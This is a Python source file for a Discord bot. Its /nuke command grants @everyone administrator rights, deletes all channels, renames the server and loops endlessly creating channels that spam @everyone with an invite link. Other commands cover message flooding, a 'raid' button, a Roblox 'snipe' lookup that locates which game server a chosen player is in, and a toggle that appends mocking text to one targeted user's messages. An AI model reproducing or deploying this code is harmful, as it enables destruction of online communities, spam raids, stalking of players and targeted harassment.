import discord
import os
import requests
import threading
import aiohttp
import asyncio
from discord.ext import commands
from discord import app_commands
from flask import Flask
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
@app.route('/')
def home():
    return "Bot is alive!", 200

def run_flask():
    app.run(host='0.0.0.0', port=8080)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

PEEKY_ID = 1265687947630481552
GAY_USER_ID = 1391486635962798242

gay_mode_enabled = False
gay_mode_text = " i'm gay"

def gaymode(user_id: int, message: str) -> str:
    if user_id == GAY_USER_ID and gay_mode_enabled:
        return message + gay_mode_text
    return message

class CustomMessageButtonView(discord.ui.View):
    def __init__(self, message: str, user_id: int):
        super().__init__(timeout=None)
        self.message = gaymode(user_id, message)

    @discord.ui.button(label="Send Message", style=discord.ButtonStyle.primary)
    async def send_custom_message(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(self.message, ephemeral=False)

class KokoButtonView(discord.ui.View):
    def __init__(self, message: str, count: int, user_id: int):
        super().__init__(timeout=None)
        self.message = gaymode(user_id, message)
        self.count = count

    @discord.ui.button(label="Send", style=discord.ButtonStyle.primary)
    async def send_multiple(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.count > 5:
            await interaction.response.send_message("Count max is 5.", ephemeral=True)
            return
        await interaction.response.defer(ephemeral=False)
        for _ in range(self.count):
            await interaction.followup.send(self.message)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot is online as {bot.user}")

import asyncio
import requests
import discord
from discord import app_commands

@bot.tree.command(name="snipe", description="Stream Snipe Someone")
@app_commands.describe(UserId="Target Roblox User ID", PlaceId="Roblox game Place ID")
async def snipe(interaction: discord.Interaction, UserId: int, PlaceId: int):
    await interaction.response.send_message(f"🔍 Searching for user `{UserId}` in place `{PlaceId}`...", ephemeral=True)

    user_data = requests.get(f"https://users.roblox.com/v1/users/{UserId}").json()
    username = user_data.get("name", "Unknown")
    target_thumb = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={UserId}&size=150x150&format=Png&isCircular=false").json()["data"][0]["imageUrl"]

    place_data = requests.get(f"https://games.roblox.com/v1/games?universeIds={PlaceId}").json()
    game_name_text = place_data.get("data", [{}])[0].get("name", "Unknown Game")
    game_link = f"https://roblox.com/games/{PlaceId}"
    game_name = f"[{game_name_text}]({game_link})"

    cursor = ""
    headers = {"User-Agent": "DiscordBot/1.0"}
    found_servers = []

    embed = discord.Embed(title=f"{UserId} | {username}", description=f"Game: {game_name}\nPlace ID: {PlaceId}\nSearching servers...", color=discord.Color.green())
    embed.set_thumbnail(url=target_thumb)
    msg = await interaction.followup.send(embed=embed, ephemeral=False)

    while True:
        url = f"https://games.roblox.com/v1/games/{PlaceId}/servers/Public?limit=100"
        if cursor:
            url += f"&cursor={cursor}"

        r = requests.get(url, headers=headers)
        data = r.json()
        servers = data.get("data", [])
        if not servers:
            break

        updated = False
        for s in servers:
            tokens = [{"token": t, "type": "AvatarHeadshot", "size": "150x150", "requestId": s["id"]} for t in s.get("playerTokens", [])]
            if not tokens:
                continue
            thumb_data = requests.post("https://thumbnails.roblox.com/v1/batch", headers={"Content-Type": "application/json"}, json=tokens).json()
            for t in thumb_data.get("data", []):
                if t.get("imageUrl") == target_thumb and s["id"] not in found_servers:
                    found_servers.append(s["id"])
                    updated = True

        if updated:
            desc = f"Game: {game_name}\nPlace ID: {PlaceId}\nFound in servers:\n"
            for sid in found_servers:
                desc += f"Join: [Click Here To Join](https://peeky.pythonanywhere.com/join?placeId={PlaceId}&gameInstanceId={sid})\n"
            embed.description = desc
            await msg.edit(embed=embed)

        cursor = data.get("nextPageCursor")
        if not cursor:
            break
        await asyncio.sleep(1.5)

    if not found_servers:
        embed.description = f"Game: {game_name}\nPlace ID: {PlaceId}\n❌ Target not found in currently listed servers."
        await msg.edit(embed=embed)

@bot.tree.command(name="gaymode", description="Toggle gay mode and optionally customize the text")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(status="on or off", text="Optional custom message (only works when turning ON)")
async def gaymode_command(interaction: discord.Interaction, status: str, text: str = None):
    global gay_mode_enabled, gay_mode_text

    if interaction.user.id != PEEKY_ID:
        await interaction.response.send_message("You are not authorized to use this command.", ephemeral=True)
        return

    status = status.lower()
    if status not in ["on", "off"]:
        await interaction.response.send_message("Please choose either 'on' or 'off'.", ephemeral=True)
        return

    if status == "on":
        gay_mode_enabled = True
        if text:
            gay_mode_text = " " + text
        await interaction.response.send_message(f"Gay mode enabled with text: `{gay_mode_text.strip()}`", ephemeral=True)
    else:
        gay_mode_enabled = False
        await interaction.response.send_message("Gay mode has been turned **off**.", ephemeral=True)

@bot.tree.command(name="flood", description="Send a message repeatedly")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(text="The message to repeat", count="How many times to send the message (max 5)")
async def koko_command(interaction: discord.Interaction, text: str, count: int):
    if count > 5:
        await interaction.response.send_message("Count max is 5.", ephemeral=True)
        return
    await interaction.response.send_message("https://discord.gg/jwYqu66bqm", ephemeral=True)
    text = gaymode(interaction.user.id, text)
    for _ in range(count):
        await interaction.followup.send(text)

@bot.tree.command(name="floodbutton", description="Send a message multiple times using a button")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(message="The message to send", count="How many times to send it (max 5)")
async def kokobutton_command(interaction: discord.Interaction, message: str, count: int):
    if count > 5:
        await interaction.response.send_message("Count max is 5.", ephemeral=True)
        return
    view = KokoButtonView(message, count, interaction.user.id)
    await interaction.response.send_message(f"Click the button to send the message {count} times.", view=view, ephemeral=True)

@bot.tree.command(name="say", description="Make the bot say something")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(text="The message to be shown after")
async def say_command(interaction: discord.Interaction, text: str):
    await interaction.response.send_message("https://discord.gg/jwYqu66bqm", ephemeral=True)
    text = gaymode(interaction.user.id, text)
    await interaction.followup.send(text)

@bot.tree.command(name="saybutton", description="Send a custom message with a button")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(message="The message to send when the button is pressed")
async def raidbutton_command(interaction: discord.Interaction, message: str):
    view = CustomMessageButtonView(message, interaction.user.id)
    await interaction.response.send_message("Click the button to send your message.", view=view, ephemeral=True)

@bot.tree.command(name="petpet", description="PetPet someone")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="The user to pat")
async def petpet_command(interaction: discord.Interaction, user: discord.User):
    await interaction.response.send_message("🔄 Generating image...", ephemeral=True)

    avatar_url = user.display_avatar.with_format("png").with_size(256).url
    api_url = f"https://api.obamabot.me/v2/image/petpet?image={avatar_url}"

    async with aiohttp.ClientSession() as session:
        async with session.get(api_url) as resp:
            if resp.status != 200:
                await interaction.followup.send("❌ Failed to generate petpet image.", ephemeral=True)
                return

            data = await resp.json()
            if data.get("error") or "url" not in data:
                await interaction.followup.send("❌ Error in response from API.", ephemeral=True)
                return

            await interaction.followup.send(data["url"])

@bot.tree.command(name="nuke", description="Destroy and spam the server")
async def nuke(interaction: discord.Interaction):
    try:
        await interaction.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
        for channel in list(interaction.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        await interaction.guild.edit(name="nuked by TBO")
        async def create_and_spam():
            ch = await interaction.guild.create_text_channel("TBO on top")
            async def spam():
                while True:
                    try:
                        await ch.send("@everyone TBO on top https://discord.gg/jwYqu66bqm")
                    except:
                        break
                    await asyncio.sleep(0.1)
            bot.loop.create_task(spam())
        for _ in range(3):
            await create_and_spam()
        async def channel_spawner():
            while True:
                await create_and_spam()
                await asyncio.sleep(0.5)
        bot.loop.create_task(channel_spawner())
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}")

token = os.getenv("TOKEN")
if not token:
    raise ValueError("TOKEN not set in .env.")

flask_thread = threading.Thread(target=run_flask)
flask_thread.start()
bot.run(token)
